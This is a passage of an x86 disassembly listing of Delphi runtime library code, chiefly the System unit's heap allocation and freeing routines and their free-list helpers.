  00401955: jmp     short loc_40197B
  00401957: test    ecx, ecx
  00401959: jns     short loc_40195E
  0040195B: add     ecx, 3
  0040195E: sar     ecx, 2
  00401961: mov     ebx, ds:hMem
  00401967: mov     [ebx+ecx*4-0Ch], edx
  0040196B: mov     eax, [eax]
  0040196D: mov     [edx], eax
  0040196F: mov     [eax+4], edx
  00401972: pop     ebx
  00401973: retn
  00401974: mov     eax, [eax]
  00401976: mov     [edx], eax
  00401978: mov     [eax+4], edx
  0040197B: pop     ebx
  0040197C: retn

Function: unknown_libname_13
  00401980: mov     edx, ds:dword_406610
  00401986: jmp     short loc_401998
  00401988: mov     ecx, [edx+8]
  0040198B: cmp     eax, ecx
  0040198D: jb      short loc_401996
  0040198F: add     ecx, [edx+0Ch]
  00401992: cmp     eax, ecx
  00401994: jb      short loc_4019AC
  00401996: mov     edx, [edx]
  00401998: cmp     edx, offset dword_406610
  0040199E: jnz     short loc_401988
  004019A0: mov     ds:dword_4065B0, 3
  004019AA: xor     edx, edx
  004019AC: mov     eax, edx
  004019AE: retn

Function: unknown_libname_14
  004019B0: push    ebx
  004019B1: mov     ecx, edx
  004019B3: sub     ecx, 4
  004019B6: lea     ebx, [ecx+eax]
  004019B9: cmp     edx, 10h
  004019BC: jl      short loc_4019CD
  004019BE: mov     dword ptr [ebx], 80000007h
  004019C4: mov     edx, ecx
  004019C6: call    unknown_libname_19; BDS 2005-2007 and Delphi6-7 Visual Component Library
  004019CB: pop     ebx
  004019CC: retn
  004019CD: cmp     edx, 4
  004019D0: jl      short loc_4019DE
  004019D2: mov     ecx, edx
  004019D4: or      ecx, 80000002h
  004019DA: mov     [eax], ecx
  004019DC: mov     [ebx], ecx
  004019DE: pop     ebx
  004019DF: retn

Function: unknown_libname_15
  004019E0: inc     ds:dword_40659C
  004019E6: mov     edx, eax
  004019E8: sub     edx, 4
  004019EB: mov     edx, [edx]
  004019ED: and     edx, 7FFFFFFCh
  004019F3: sub     edx, 4
  004019F6: add     ds:dword_4065A0, edx
  004019FC: call    @System@SysFreeMem$qqrpv; System::SysFreeMem(void *)
  00401A01: retn

Function: unknown_libname_16
  00401A04: cmp     edx, 0Ch
  00401A07: jl      short loc_401A17
  00401A09: or      edx, 2
  00401A0C: mov     [eax], edx
  00401A0E: add     eax, 4
  00401A11: call    unknown_libname_15; BDS 2005-2007 and Delphi6-7 Visual Component Library
  00401A16: retn
  00401A17: cmp     edx, 4
  00401A1A: jl      short loc_401A26
  00401A1C: mov     ecx, edx
  00401A1E: or      ecx, 80000002h
  00401A24: mov     [eax], ecx
  00401A26: add     eax, edx
  00401A28: and     dword ptr [eax], 0FFFFFFFEh
  00401A2B: retn

Function: unknown_libname_17
  00401A2C: push    ebx
  00401A2D: push    esi
  00401A2E: mov     edx, eax
  00401A30: sub     edx, 4
  00401A33: mov     edx, [edx]
  00401A35: mov     ecx, edx
  00401A37: and     ecx, 80000002h
  00401A3D: cmp     ecx, 80000002h
  00401A43: jz      short loc_401A4F
  00401A45: mov     ds:dword_4065B0, 4
  00401A4F: mov     ebx, edx
  00401A51: and     ebx, 7FFFFFFCh
  00401A57: sub     eax, ebx
  00401A59: mov     ecx, eax
  00401A5B: xor     edx, [ecx]
  00401A5D: test    edx, 0FFFFFFFEh
  00401A63: jz      short loc_401A6F
  00401A65: mov     ds:dword_4065B0, 5
  00401A6F: test    byte ptr [ecx], 1
  00401A72: jz      short loc_401A94
  00401A74: mov     edx, eax
  00401A76: sub     edx, 0Ch
  00401A79: mov     esi, [edx+8]
  00401A7C: sub     eax, esi
  00401A7E: cmp     esi, [eax+8]
  00401A81: jz      short loc_401A8D
  00401A83: mov     ds:dword_4065B0, 6
  00401A8D: call    unknown_libname_12; BDS 2005-2007 and Delphi6-7 Visual Component Library
  00401A92: add     ebx, esi
  00401A94: mov     eax, ebx
  00401A96: pop     esi
  00401A97: pop     ebx
  00401A98: retn

Function: unknown_libname_18
  00401A9C: push    ebx
  00401A9D: push    esi
  00401A9E: push    edi
  00401A9F: mov     ebx, eax
  00401AA1: xor     edi, edi
  00401AA3: mov     eax, [ebx]
  00401AA5: test    eax, 80000000h
  00401AAA: jz      short loc_401AB7
  00401AAC: and     eax, 7FFFFFFCh
  00401AB1: add     edi, eax
  00401AB3: add     ebx, eax
  00401AB5: mov     eax, [ebx]
  00401AB7: test    al, 2
  00401AB9: jnz     short loc_401ACE
  00401ABB: mov     esi, ebx
  00401ABD: mov     eax, esi
  00401ABF: call    unknown_libname_12; BDS 2005-2007 and Delphi6-7 Visual Component Library
  00401AC4: mov     eax, [esi+8]
  00401AC7: add     edi, eax
  00401AC9: add     ebx, eax
  00401ACB: and     dword ptr [ebx], 0FFFFFFFEh
  00401ACE: mov     eax, edi
  00401AD0: pop     edi
  00401AD1: pop     esi
  00401AD2: pop     ebx
  00401AD3: retn

Function: @System@_16456_0
  00401AD4: push    ebx
  00401AD5: push    esi
  00401AD6: push    edi
  00401AD7: push    ebp
  00401AD8: add     esp, 0FFFFFFF4h
  00401ADB: mov     edi, edx
  00401ADD: mov     esi, eax
  00401ADF: mov     [esp+1Ch+var_1C], 0
  00401AE3: mov     eax, esi
  00401AE5: call    unknown_libname_13; BDS 2005-2007 and Delphi6-7 Visual Component Library
  00401AEA: mov     ebx, eax
  00401AEC: test    ebx, ebx
  00401AEE: jz      loc_401B76
  00401AF4: mov     ebp, [ebx+8]
  00401AF7: mov     eax, ebp
  00401AF9: add     eax, [ebx+0Ch]
  00401AFC: mov     edx, eax
  00401AFE: lea     ecx, [edi+esi]
  00401B01: sub     edx, ecx
  00401B03: cmp     edx, 0Ch
  00401B06: jg      short loc_401B0C
  00401B08: mov     edi, eax
  00401B0A: sub     edi, esi
  00401B0C: mov     eax, esi
  00401B0E: sub     eax, ebp
  00401B10: cmp     eax, 0Ch
  00401B13: jge     short loc_401B29
  00401B15: lea     ecx, [esp+1Ch+var_1B]
  00401B19: mov     edx, esi
  00401B1B: sub     edx, [ebx+8]
  00401B1E: add     edx, edi
  00401B20: mov     eax, ebp
  00401B22: call    unknown_libname_11; BDS 2005-2007 and Delphi6-7 Visual Component Library
  00401B27: jmp     short loc_401B3A
  00401B29: lea     ecx, [esp+1Ch+var_1B]
  00401B2D: mov     edx, edi
  00401B2F: sub     edx, 4
  00401B32: lea     eax, [esi+4]
  00401B35: call    unknown_libname_11; BDS 2005-2007 and Delphi6-7 Visual Component Library
  00401B3A: mov     ebp, [esp+1Ch+var_1B]
  00401B3E: test    ebp, ebp
  00401B40: jz      short loc_401B76
  00401B42: mov     edx, ebp
  00401B44: sub     edx, esi
  00401B46: mov     eax, esi
  00401B48: call    unknown_libname_14; BDS 2005-2007 and Delphi6-7 Visual Component Library
  00401B4D: mov     eax, ebp
  00401B4F: add     eax, [esp+1Ch+var_17]
  00401B53: mov     edx, [ebx+8]
  00401B56: add     edx, [ebx+0Ch]
  00401B59: cmp     eax, edx
  00401B5B: jnb     short loc_401B67
  00401B5D: lea     edx, [edi+esi]
  00401B60: sub     edx, eax
  00401B62: call    unknown_libname_16; BDS 2005-2007 and Delphi6-7 Visual Component Library
  00401B67: lea     edx, [esp+1Ch+var_1B]
  00401B6B: mov     eax, ebx
  00401B6D: call    @System@_16457; System::_16457
  00401B72: mov     [esp+1Ch+var_1C], 1
  00401B76: mov     al, [esp+1Ch+var_1C]
  00401B79: add     esp, 0Ch
  00401B7C: pop     ebp
  00401B7D: pop     edi
  00401B7E: pop     esi
  00401B7F: pop     ebx
  00401B80: retn

Function: unknown_libname_19
  00401B84: push    ebx
  00401B85: push    esi
  00401B86: push    edi
  00401B87: mov     esi, edx
  00401B89: mov     edi, eax
  00401B8B: mov     ebx, edi
  00401B8D: mov     [ebx+8], esi
  00401B90: mov     eax, ebx
  00401B92: add     eax, esi
  00401B94: sub     eax, 0Ch
  00401B97: mov     [eax+8], esi
  00401B9A: cmp     esi, 1000h
  00401BA0: jg      short loc_401BD9
  00401BA2: mov     edx, esi
  00401BA4: test    edx, edx
  00401BA6: jns     short loc_401BAB
  00401BA8: add     edx, 3
  00401BAB: sar     edx, 2
  00401BAE: mov     eax, ds:hMem
  00401BB3: mov     eax, [eax+edx*4-0Ch]
  00401BB7: test    eax, eax
  00401BB9: jnz     short loc_401BCB
  00401BBB: mov     eax, ds:hMem
  00401BC0: mov     [eax+edx*4-0Ch], ebx
  00401BC4: mov     [ebx+4], ebx
  00401BC7: mov     [ebx], ebx
  00401BC9: jmp     short loc_401C05
  00401BCB: mov     edx, [eax]
  00401BCD: mov     [ebx+4], eax
  00401BD0: mov     [ebx], edx
  00401BD2: mov     [eax], ebx
  00401BD4: mov     [edx+4], ebx
  00401BD7: jmp     short loc_401C05
  00401BD9: cmp     esi, 3C00h
  00401BDF: jl      short loc_401BEE
  00401BE1: mov     edx, esi
  00401BE3: mov     eax, edi
  00401BE5: call    @System@_16456_0; System::_16456
  00401BEA: test    al, al
  00401BEC: jnz     short loc_401C05
  00401BEE: mov     eax, ds:dword_406600
  00401BF3: mov     ds:dword_406600, ebx
  00401BF9: mov     edx, [eax]
  00401BFB: mov     [ebx+4], eax
  00401BFE: mov     [ebx], edx
  00401C00: mov     [eax], ebx
  00401C02: mov     [edx+4], ebx
  00401C05: pop     edi
  00401C06: pop     esi
  00401C07: pop     ebx
  00401C08: retn

Function: unknown_libname_20
  00401C0C: cmp     ds:dword_406604, 0
  00401C13: jle     short locret_1C55
  00401C15: cmp     ds:dword_406604, 0Ch
  00401C1C: jge     short loc_401C2A
  00401C1E: mov     ds:dword_4065B0, 7
  00401C28: jmp     short locret_1C55
  00401C2A: mov     eax, ds:dword_406604
  00401C2F: or      eax, 2
  00401C32: mov     edx, ds:dword_406608
  00401C38: mov     [edx], eax
  00401C3A: mov     eax, ds:dword_406608
  00401C3F: add     eax, 4
  00401C42: call    unknown_libname_15; BDS 2005-2007 and Delphi6-7 Visual Component Library
  00401C47: xor     eax, eax
  00401C49: mov     ds:dword_406608, eax
  00401C4E: xor     eax, eax
  00401C50: mov     ds:dword_406604, eax
  00401C55: retn

Function: unknown_libname_21
  00401C58: push    ebx
  00401C59: push    esi
  00401C5A: push    edi
  00401C5B: add     esp, 0FFFFFFF0h
  00401C5E: mov     esi, eax
  00401C60: lea     edi, [esp+1Ch+var_1C]
  00401C63: movsd
  00401C64: movsd
  00401C65: mov     edi, esp
  00401C67: call    unknown_libname_20; BDS 2005-2007 and Delphi6-7 Visual Component Library
  00401C6C: lea     ecx, [esp+1Ch+var_14]
  00401C70: mov     edx, edi
  00401C72: mov     eax, offset dword_406610
  00401C77: call    @System@_16456; System::_16456
  00401C7C: mov     ebx, [esp+1Ch+var_14]
  00401C80: test    ebx, ebx
  00401C82: jnz     short loc_401C88
  00401C84: xor     eax, eax
  00401C86: jmp     short loc_401CDA
  00401C88: mov     eax, [edi]
  00401C8A: cmp     ebx, eax
  00401C8C: jnb     short loc_401C98
  00401C8E: call    unknown_libname_17; BDS 2005-2007 and Delphi6-7 Visual Component Library
  00401C93: sub     [edi], eax
  00401C95: add     [edi+4], eax
  00401C98: mov     eax, [edi]
  00401C9A: add     eax, [edi+4]
  00401C9D: mov     esi, ebx
  00401C9F: add     esi, [esp+1Ch+var_10]
  00401CA3: cmp     eax, esi
  00401CA5: jnb     short loc_401CAF
  00401CA7: call    unknown_libname_18; BDS 2005-2007 and Delphi6-7 Visual Component Library
  00401CAC: add     [edi+4], eax
  00401CAF: mov     eax, [edi]
  00401CB1: add     eax, [edi+4]
  00401CB4: cmp     esi, eax
  00401CB6: jnz     short loc_401CC9
  00401CB8: sub     eax, 4
  00401CBB: mov     edx, 4
  00401CC0: call    unknown_libname_14; BDS 2005-2007 and Delphi6-7 Visual Component Library
  00401CC5: sub     dword ptr [edi+4], 4
  00401CC9: mov     eax, [edi]
  00401CCB: mov     ds:dword_406608, eax
  00401CD0: mov     eax, [edi+4]
  00401CD3: mov     ds:dword_406604, eax
  00401CD8: mov     al, 1
  00401CDA: add     esp, 10h
  00401CDD: pop     edi
  00401CDE: pop     esi
  00401CDF: pop     ebx
  00401CE0: retn

Function: unknown_libname_22
  00401CE4: push    ebx
  00401CE5: add     esp, 0FFFFFFF8h
  00401CE8: mov     ebx, eax
  00401CEA: mov     edx, esp
  00401CEC: lea     eax, [ebx+4]
  00401CEF: call    unknown_libname_9; BDS 2005-2007 and Delphi6-7 Visual Component Library
  00401CF4: cmp     [esp+0Ch+var_C], 0
  00401CF8: jz      short loc_401D05
  00401CFA: mov     eax, esp
  00401CFC: call    unknown_libname_21; BDS 2005-2007 and Delphi6-7 Visual Component Library
  00401D01: test    al, al
  00401D03: jnz     short loc_401D09
  00401D05: xor     eax, eax
  00401D07: jmp     short loc_401D0B
  00401D09: mov     al, 1
  00401D0B: pop     ecx
  00401D0C: pop     edx
  00401D0D: pop     ebx
  00401D0E: retn

Function: unknown_libname_23
  00401D10: push    ebx
  00401D11: push    esi
  00401D12: add     esp, 0FFFFFFF8h
  00401D15: mov     esi, edx
  00401D17: mov     ebx, eax
  00401D19: mov     ecx, esp
  00401D1B: lea     edx, [esi+4]
  00401D1E: mov     eax, ebx; lpAddress
  00401D20: call    unknown_libname_10; BDS 2005-2007 and Delphi6-7 Visual Component Library
  00401D25: cmp     [esp+10h+var_10], 0
  00401D29: jz      short loc_401D36
  00401D2B: mov     eax, esp
  00401D2D: call    unknown_libname_21; BDS 2005-2007 and Delphi6-7 Visual Component Library
  00401D32: test    al, al
  00401D34: jnz     short loc_401D3A
  00401D36: xor     eax, eax
  00401D38: jmp     short loc_401D3C
  00401D3A: mov     al, 1
  00401D3C: pop     ecx
  00401D3D: pop     edx
  00401D3E: pop     esi
  00401D3F: pop     ebx
  00401D40: retn

Function: unknown_libname_24
  00401D44: xor     edx, edx
  00401D46: test    eax, eax
  00401D48: jns     short loc_401D4D
  00401D4A: add     eax, 3
  00401D4D: sar     eax, 2
  00401D50: cmp     eax, 400h
  00401D55: jg      short loc_401D6D
  00401D57: mov     edx, ds:hMem
  00401D5D: mov     edx, [edx+eax*4-0Ch]
  00401D61: test    edx, edx
  00401D63: jnz     short loc_401D6D
  00401D65: inc     eax
  00401D66: cmp     eax, 401h
  00401D6B: jnz     short loc_401D57
  00401D6D: mov     eax, edx
  00401D6F: retn

Function: unknown_libname_25
  00401D70: push    ebx
  00401D71: push    esi
  00401D72: push    edi
  00401D73: push    ebp
  00401D74: mov     esi, eax
  00401D76: mov     edi, offset dword_406600
  00401D7B: mov     ebp, offset dword_406604
  00401D80: mov     ebx, ds:dword_4065F8
  00401D86: cmp     esi, [ebx+8]
  00401D89: jle     loc_401E13
  00401D8F: mov     ebx, [edi]
  00401D91: mov     eax, [ebx+8]
  00401D94: cmp     esi, eax
  00401D96: jle     short loc_401E13
  00401D98: mov     [ebx+8], esi
  00401D9B: mov     ebx, [ebx+4]
  00401D9E: cmp     esi, [ebx+8]
  00401DA1: jg      short loc_401D9B
  00401DA3: mov     edx, [edi]
  00401DA5: mov     [edx+8], eax
  00401DA8: cmp     ebx, [edi]
  00401DAA: jz      short loc_401DB0
  00401DAC: mov     [edi], ebx
  00401DAE: jmp     short loc_401E13
  00401DB0: cmp     esi, 1000h
  00401DB6: jg      short loc_401DC5
  00401DB8: mov     eax, esi
  00401DBA: call    unknown_libname_24; BDS 2005-2007 and Delphi6-7 Visual Component Library
  00401DBF: mov     ebx, eax
  00401DC1: test    ebx, ebx
  00401DC3: jnz     short loc_401E13
  00401DC5: mov     eax, esi
  00401DC7: call    unknown_libname_22; BDS 2005-2007 and Delphi6-7 Visual Component Library
  00401DCC: test    al, al
  00401DCE: jnz     short loc_401DD7
  00401DD0: xor     eax, eax
  00401DD2: jmp     loc_401E5F
  00401DD7: cmp     esi, [ebp+0]
  00401DDA: jg      short loc_401D80
  00401DDC: sub     [ebp+0], esi
  00401DDF: cmp     dword ptr [ebp+0], 0Ch
  00401DE3: jge     short loc_401DED
  00401DE5: add     esi, [ebp+0]
  00401DE8: xor     eax, eax
  00401DEA: mov     [ebp+0], eax
  00401DED: mov     eax, ds:dword_406608
  00401DF2: add     ds:dword_406608, esi
  00401DF8: mov     edx, esi
  00401DFA: or      edx, 2
  00401DFD: mov     [eax], edx
  00401DFF: add     eax, 4
  00401E02: inc     ds:dword_40659C
  00401E08: sub     esi, 4
  00401E0B: add     ds:dword_4065A0, esi
  00401E11: jmp     short loc_401E5F
  00401E13: mov     eax, ebx
  00401E15: call    unknown_libname_12; BDS 2005-2007 and Delphi6-7 Visual Component Library
  00401E1A: mov     edx, [ebx+8]
  00401E1D: mov     eax, edx
  00401E1F: sub     eax, esi
  00401E21: cmp     eax, 0Ch
  00401E24: jl      short loc_401E32
  00401E26: mov     edx, ebx
  00401E28: add     edx, esi
  00401E2A: xchg    eax, edx
  00401E2B: call    unknown_libname_19; BDS 2005-2007 and Delphi6-7 Visual Component Library
  00401E30: jmp     short loc_401E44
  00401E32: mov     esi, edx
  00401E34: cmp     ebx, [edi]
  00401E36: jnz     short loc_401E3D
  00401E38: mov     eax, [ebx+4]
  00401E3B: mov     [edi], eax
  00401E3D: mov     eax, ebx
  00401E3F: add     eax, esi
  00401E41: and     dword ptr [eax], 0FFFFFFFEh
  00401E44: mov     eax, ebx
  00401E46: mov     edx, esi
  00401E48: or      edx, 2
  00401E4B: mov     [eax], edx
  00401E4D: add     eax, 4
  00401E50: inc     ds:dword_40659C
  00401E56: sub     esi, 4
  00401E59: add     ds:dword_4065A0, esi
  00401E5F: pop     ebp
  00401E60: pop     edi
  00401E61: pop     esi
  00401E62: pop     ebx
  00401E63: retn

Function: @System@SysGetMem$qqri
  00401E64: push    ebp
  00401E65: mov     ebp, esp
  00401E67: add     esp, 0FFFFFFF8h
  00401E6A: push    ebx
  00401E6B: push    esi
  00401E6C: push    edi
  00401E6D: mov     ebx, eax
  00401E6F: cmp     ds:byte_65AC, 0
  00401E76: jnz     short loc_401E81
  00401E78: call    @System@_16447; System::_16447
  00401E7D: test    al, al
  00401E7F: jz      short loc_401E89
  00401E81: cmp     ebx, 7FFFFFF8h
  00401E87: jle     short loc_401E93
  00401E89: xor     eax, eax
  00401E8B: mov     [ebp+var_4], eax
  00401E8E: jmp     loc_401FE7
  00401E93: xor     ecx, ecx
  00401E95: push    ebp
  00401E96: push    offset loc_401FE0
  00401E9B: push    dword ptr fs:[ecx]
  00401E9E: mov     fs:[ecx], esp
  00401EA1: cmp     ds:byte_6035, 0
  00401EA8: jz      short loc_401EB4
  00401EAA: push    offset CriticalSection; lpCriticalSection
  00401EAF: call    EnterCriticalSection
  00401EB4: add     ebx, 7
  00401EB7: and     ebx, 0FFFFFFFCh
  00401EBA: cmp     ebx, 0Ch
  00401EBD: jge     short loc_401EC4
  00401EBF: mov     ebx, 0Ch
  00401EC4: cmp     ebx, 1000h
  00401ECA: jg      loc_401F63
  00401ED0: mov     eax, ebx
  00401ED2: test    eax, eax
  00401ED4: jns     short loc_401ED9
  00401ED6: add     eax, 3
  00401ED9: sar     eax, 2
  00401EDC: mov     edx, ds:hMem
  00401EE2: mov     edx, [edx+eax*4-0Ch]
  00401EE6: test    edx, edx
  00401EE8: jz      short loc_401F63
  00401EEA: mov     esi, edx
  00401EEC: mov     eax, esi
  00401EEE: add     eax, ebx
  00401EF0: and     dword ptr [eax], 0FFFFFFFEh
  00401EF3: mov     eax, [edx+4]
  00401EF6: cmp     edx, eax
  00401EF8: jnz     short loc_401F14
  00401EFA: mov     eax, ebx
  00401EFC: test    eax, eax
  00401EFE: jns     short loc_401F03
  00401F00: add     eax, 3
  00401F03: sar     eax, 2
  00401F06: mov     ecx, ds:hMem
  00401F0C: xor     edi, edi
  00401F0E: mov     [ecx+eax*4-0Ch], edi
  00401F12: jmp     short loc_401F3A
  00401F14: mov     ecx, ebx
  00401F16: test    ecx, ecx
  00401F18: jns     short loc_401F1D
  00401F1A: add     ecx, 3
  00401F1D: sar     ecx, 2
  00401F20: mov     edi, ds:hMem
  00401F26: mov     [edi+ecx*4-0Ch], eax
  00401F2A: mov     ecx, [edx]
  00401F2C: mov     [ebp+var_8], ecx
  00401F2F: mov     ecx, [ebp+var_8]
  00401F32: mov     [ecx+4], eax
  00401F35: mov     ecx, [ebp+var_8]
  00401F38: mov     [eax], ecx
  00401F3A: mov     eax, esi
  00401F3C: mov     edx, [edx+8]
  00401F3F: or      edx, 2
  00401F42: mov     [eax], edx
  00401F44: add     eax, 4
  00401F47: mov     [ebp+var_4], eax
  00401F4A: inc     ds:dword_40659C
  00401F50: sub     ebx, 4
  00401F53: add     ds:dword_4065A0, ebx
  00401F59: call    @System@@TryFinallyExit$qqrv; System::__linkproc__ TryFinallyExit(void)
  00401F5E: jmp     loc_401FE7
  00401F63: cmp     ebx, ds:dword_406604
  00401F69: jg      short loc_401FB5
  00401F6B: sub     ds:dword_406604, ebx
  00401F71: cmp     ds:dword_406604, 0Ch
  00401F78: jge     short loc_401F87
  00401F7A: add     ebx, ds:dword_406604
  00401F80: xor     eax, eax
  00401F82: mov     ds:dword_406604, eax
  00401F87: mov     eax, ds:dword_406608
  00401F8C: add     ds:dword_406608, ebx
  00401F92: mov     edx, ebx
  00401F94: or      edx, 2
  00401F97: mov     [eax], edx
  00401F99: add     eax, 4
  00401F9C: mov     [ebp+var_4], eax
  00401F9F: inc     ds:dword_40659C
  00401FA5: sub     ebx, 4
  00401FA8: add     ds:dword_4065A0, ebx
  00401FAE: call    @System@@TryFinallyExit$qqrv; System::__linkproc__ TryFinallyExit(void)
  00401FB3: jmp     short loc_401FE7
  00401FB5: mov     eax, ebx
  00401FB7: call    unknown_libname_25; BDS 2005-2007 and Delphi6-7 Visual Component Library
  00401FBC: mov     [ebp+var_4], eax
  00401FBF: xor     eax, eax
  00401FC1: pop     edx
  00401FC2: pop     ecx
  00401FC3: pop     ecx
  00401FC4: mov     fs:[eax], edx
  00401FC7: push    offset loc_401FE7
  00401FCC: cmp     ds:byte_6035, 0
  00401FD3: jz      short loc_401FDF
  00401FD5: push    offset CriticalSection; lpCriticalSection
  00401FDA: call    LeaveCriticalSection
  00401FDF: retn
  00401FE0: jmp     unknown_libname_39; BDS 2005-2007 and Delphi6-7 Visual Component Library
  00401FE5: jmp     short loc_401FCC
  00401FE7: mov     eax, [ebp+var_4]
  00401FEA: pop     edi
  00401FEB: pop     esi
  00401FEC: pop     ebx
  00401FED: pop     ecx
  00401FEE: pop     ecx
  00401FEF: pop     ebp
  00401FF0: retn

Function: @System@SysFreeMem$qqrpv
  00401FF4: push    ebp
  00401FF5: mov     ebp, esp
  00401FF7: push    ecx
  00401FF8: push    ebx
  00401FF9: push    esi
  00401FFA: push    edi
  00401FFB: mov     ebx, eax
  00401FFD: xor     eax, eax
  00401FFF: mov     ds:dword_4065B0, eax
  00402004: cmp     ds:byte_65AC, 0
  0040200B: jnz     short loc_40202C
  0040200D: call    @System@_16447; System::_16447
  00402012: test    al, al
  00402014: jnz     short loc_40202C
  00402016: mov     ds:dword_4065B0, 8
  00402020: mov     [ebp+var_4], 8
  00402027: jmp     loc_40218D
  0040202C: xor     ecx, ecx
  0040202E: push    ebp
  0040202F: push    offset loc_402186
  00402034: push    dword ptr fs:[ecx]
  00402037: mov     fs:[ecx], esp
  0040203A: cmp     ds:byte_6035, 0
  00402041: jz      short loc_40204D
  00402043: push    offset CriticalSection; lpCriticalSection
  00402048: call    EnterCriticalSection
  0040204D: mov     esi, ebx
  0040204F: sub     esi, 4
  00402052: mov     ebx, [esi]
  00402054: test    bl, 2
  00402057: jnz     short loc_402068
  00402059: mov     ds:dword_4065B0, 9
  00402063: jmp     loc_40215D
  00402068: dec     ds:dword_40659C
  0040206E: mov     eax, ebx
  00402070: and     eax, 7FFFFFFCh
  00402075: sub     eax, 4
  00402078: sub     ds:dword_4065A0, eax
  0040207E: test    bl, 1
  00402081: jz      short loc_4020C8
  00402083: mov     eax, esi
  00402085: sub     eax, 0Ch
  00402088: mov     edx, [eax+8]
  0040208B: cmp     edx, 0Ch
  0040208E: jl      short loc_402098
  00402090: test    edx, 80000003h
  00402096: jz      short loc_4020A7
  00402098: mov     ds:dword_4065B0, 0Ah
  004020A2: jmp     loc_40215D
  004020A7: mov     eax, esi
  004020A9: sub     eax, edx
  004020AB: cmp     edx, [eax+8]
  004020AE: jz      short loc_4020BF
  004020B0: mov     ds:dword_4065B0, 0Ah
  004020BA: jmp     loc_40215D
  004020BF: add     ebx, edx
  004020C1: mov     esi, eax
  004020C3: call    unknown_libname_12; BDS 2005-2007 and Delphi6-7 Visual Component Library
  004020C8: and     ebx, 7FFFFFFCh
  004020CE: mov     eax, esi
  004020D0: add     eax, ebx
  004020D2: mov     edi, eax
  004020D4: cmp     edi, ds:dword_406608
  004020DA: jnz     short loc_402108
  004020DC: sub     ds:dword_406608, ebx
  004020E2: add     ds:dword_406604, ebx
  004020E8: cmp     ds:dword_406604, 3C00h
  004020F2: jle     short loc_4020F9
  004020F4: call    unknown_libname_20; BDS 2005-2007 and Delphi6-7 Visual Component Library
  004020F9: xor     eax, eax
  004020FB: mov     [ebp+var_4], eax
  004020FE: call    @System@@TryFinallyExit$qqrv; System::__linkproc__ TryFinallyExit(void)
  00402103: jmp     loc_40218D
  00402108: mov     edx, [eax]
  0040210A: test    dl, 2
  0040210D: jz      short loc_40212B
  0040210F: and     edx, 7FFFFFFCh
  00402115: cmp     edx, 4
  00402118: jge     short loc_402126
  0040211A: mov     ds:dword_4065B0, 0Bh
  00402124: jmp     short loc_40215D
  00402126: or      dword ptr [eax], 1
  00402129: jmp     short loc_402154
  0040212B: mov     eax, edi
  0040212D: cmp     dword ptr [eax+4], 0
  00402131: jz      short loc_40213E
  00402133: cmp     dword ptr [eax], 0
  00402136: jz      short loc_40213E
  00402138: cmp     dword ptr [eax+8], 0Ch
  0040213C: jge     short loc_40214A
  0040213E: mov     ds:dword_4065B0, 0Bh
  00402148: jmp     short loc_40215D
  0040214A: mov     edx, [eax+8]
  0040214D: add     ebx, edx
  0040214F: call    unknown_libname_12; BDS 2005-2007 and Delphi6-7 Visual Component Library
  00402154: mov     edx, ebx
  00402156: mov     eax, esi
  00402158: call    unknown_libname_19; BDS 2005-2007 and Delphi6-7 Visual Component Library
  0040215D: mov     eax, ds:dword_4065B0
  00402162: mov     [ebp+var_4], eax
  00402165: xor     eax, eax
  00402167: pop     edx
  00402168: pop     ecx
  00402169: pop     ecx
  0040216A: mov     fs:[eax], edx
  0040216D: push    offset loc_40218D
  00402172: cmp     ds:byte_6035, 0
  00402179: jz      short loc_402185
  0040217B: push    offset CriticalSection; lpCriticalSection
  00402180: call    LeaveCriticalSection
  00402185: retn
  00402186: jmp     unknown_libname_39; BDS 2005-2007 and Delphi6-7 Visual Component Library
  0040218B: jmp     short loc_402172
  0040218D: mov     eax, [ebp+var_4]
  00402190: pop     edi
  00402191: pop     esi
  00402192: pop     ebx
  00402193: pop     ecx
  00402194: pop     ebp
  00402195: retn

Function: @System@_16485
  00402198: push    ebx
  00402199: push    esi
  0040219A: push    edi
  0040219B: push    ebp
  0040219C: add     esp, 0FFFFFFF8h
  0040219F: mov     esi, edx
  004021A1: add     esi, 7
  004021A4: and     esi, 0FFFFFFFCh
  004021A7: cmp     esi, 0Ch
  004021AA: jge     short loc_4021B1
  004021AC: mov     esi, 0Ch
  004021B1: mov     ebp, eax
  004021B3: sub     ebp, 4
  004021B6: mov     edi, [ebp+0]
  004021B9: and     edi, 7FFFFFFCh
  004021BF: mov     eax, ebp
  004021C1: add     eax, edi
  004021C3: mov     ebx, eax
  004021C5: cmp     edi, esi
  004021C7: jnz     short loc_4021D0
  004021C9: mov     al, 1
  004021CB: jmp     loc_40236B
  004021D0: cmp     edi, esi
  004021D2: jle     loc_40225B
  004021D8: mov     edx, edi
  004021DA: sub     edx, esi
  004021DC: mov     [esp+18h+var_18], edx
  004021DF: cmp     ebx, ds:dword_406608
  004021E5: jnz     short loc_40221F
  004021E7: mov     eax, [esp+18h+var_18]
  004021EA: sub     ds:dword_406608, eax
  004021F0: mov     eax, [esp+18h+var_18]
  004021F3: add     ds:dword_406604, eax
  004021F9: cmp     ds:dword_406604, 0Ch
  00402200: jge     loc_402352
  00402206: mov     eax, [esp+18h+var_18]
  00402209: add     ds:dword_406608, eax
  0040220F: mov     eax, [esp+18h+var_18]
  00402212: sub     ds:dword_406604, eax
  00402218: mov     esi, edi
  0040221A: jmp     loc_402352
  0040221F: mov     ebx, eax
  00402221: test    byte ptr [ebx], 2
  00402224: jnz     short loc_402233
  00402226: mov     eax, ebx
  00402228: mov     edx, [eax+8]
  0040222B: add     [esp+18h+var_18], edx
  0040222E: call    unknown_libname_12; BDS 2005-2007 and Delphi6-7 Visual Component Library
  00402233: cmp     [esp+18h+var_18], 0Ch
  00402237: jl      short loc_402254
  00402239: mov     ebx, ebp
  0040223B: add     ebx, esi
  0040223D: mov     eax, [esp+18h+var_18]
  00402240: or      eax, 2
  00402243: mov     [ebx], eax
  00402245: mov     eax, ebx
  00402247: add     eax, 4
  0040224A: call    unknown_libname_15; BDS 2005-2007 and Delphi6-7 Visual Component Library
  0040224F: jmp     loc_402352
  00402254: mov     esi, edi
  00402256: jmp     loc_402352
  0040225B: mov     eax, esi
  0040225D: sub     eax, edi
  0040225F: mov     [esp+18h+var_14], eax
  00402263: cmp     ebx, ds:dword_406608
  00402269: jnz     short loc_4022D2
  0040226B: mov     eax, ds:dword_406604
  00402270: cmp     eax, [esp+18h+var_14]
  00402274: jl      short loc_4022C9
  00402276: mov     eax, [esp+18h+var_14]
  0040227A: sub     ds:dword_406604, eax
  00402280: mov     eax, [esp+18h+var_14]
  00402284: add     ds:dword_406608, eax
  0040228A: cmp     ds:dword_406604, 0Ch
  00402291: jge     short loc_4022AB
